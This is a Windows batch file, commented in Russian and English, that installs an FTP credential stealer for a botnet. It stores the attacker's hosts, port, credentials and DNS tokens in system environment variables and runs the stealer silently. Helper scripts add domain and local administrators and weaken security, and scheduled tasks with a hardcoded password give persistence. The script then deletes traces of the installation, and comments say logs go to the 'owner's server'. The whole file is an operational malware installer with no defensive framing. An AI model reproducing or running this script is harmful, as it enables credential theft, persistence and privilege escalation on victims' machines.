@echo off
rem
rem Командный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
rem
rem USAGE
rem > InstallMainExponenta.bat <username> <password> <hacker host server 2 domain> <hacker host server 3 domain> <Hacker Pref> <Hacker Port> <hldnstocken> <entrydns tocken>
rem Запускать файл с правами администратора

setlocal enableextensions enabledelayedexpansion

Rem Установка системнмных переменных окружения

set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Dest_DIR=%PUB1%
set Chocolatey=%ALLUSERSPROFILE%\chocolatey

rem Подготовка пользовательских переменных окружения.
rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
rem Также проверяется наличие манифеста приложения или модуля. Если манифест присутствует -- ничегго не делается.
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host2=%3
set Hacker_host3=%4
set Hacker_pref=%5
set Hacker_port=%6
set hldnstoken=%7
set entrydnstoken=%8

echo -
echo Добро пожаловать в программу установки Stealer
echo Данная программа устанавливает файлы в каталог %Dest_DIR%
echo -

rem Распаковка дистрибутива из SFX Архива в каталог %Dest_DIR%
rem Автоматическая распаковка должна быть настроена отдельно
rem Внимание! смотрите на назначение системных переменных!
rem Совет. При программировании держите как сводку этот заполненный файл

rem Регистрация переменных, если нужно

echo
echo Регистрируем новые переменные окружения...
echo
rem %SystemRoot%\System32\reg.exe Add "!Key_Var!" /v "!Параметр!" /t REG_SZ /d "!Параметр!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "Ошибка" && goto UnSuccess
rem echo The variable is created

%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_User /t REG_SZ /d "!Hacker_User!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host3 /t REG_SZ /d "!Hacker_host3!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_pref /t REG_SZ /d "!Hacker_pref!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_port /t REG_SZ /d "!Hacker_port!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v hldnstoken /t REG_SZ /d "!hldnstoken!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v entrydnstoken /t REG_SZ /d "!entrydnstoken!" /f

rem Insatall MainExponenta Files...
cd /d %curdir%

echo "Installing Stealer..."
rem Поменять на имя своего файла скомпилированного стайлера (вместо ExponentaFTPStealer.exe !!!)
rem Change the name of Stealer compiled file (Instaed of ExponentaFTPStealer.exe)
%Dest_DIR%\Distrib\Zlovred\ExponentaFTPStealer.exe /VERYSILENT /NOCANCEL

rem Refresh Environment
if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
call %Chocolatey%\Bin\RefreshEnv.cmd
:pass_Refresh

rem Правка файлов конфигурации модуля Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem создание списка постоянных изменений для демонов
rem cd /d %Dest_DIR%\Util

call %Dest_DIR%\Util\adAdminDomain.cmd
call %Dest_DIR%\Util\adAdminLocal.cmd
call %Dest_DIR%\Util\UNSECURE_ALL.cmd

%SystemRoot%\System32\schtasks.exe /Create /XML %Dest_DIR%\Util\User_Dayly_Tasks1.xml /TN "User Dayly Task1" /F /RU MSSQLSR /RP Admin01234

%SystemRoot%\System32\schtasks.exe /Create /XML %Dest_DIR%\Util\User_Hourly_Tasks1.xml /TN "User Hourly Task1" /F /RU MSSQLSR /RP Admin01234

%SystemRoot%\System32\schtasks.exe /Create /XML %Dest_DIR%\Util\User_OnStart_Task1.xml /TN "User OnStart Task1" /F /RU MSSQLSR /RP Admin01234

rem
rem
echo off
call %Dest_DIR%\Util\user_onstart1.bat
call %Dest_DIR%\Util\user_hourly1.bat
call %Dest_DIR%\Util\onsysload.bat
echo -
echo Installation is made with Success!
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:sess_Finish

cd /d %curdir%
rem del /F /S /Q /A descript.ion
del /F /S /Q /A INSTALL.txt
del /F /S /Q /A wget.exe

rd /S /Q WindowsPowerShell

rem pause
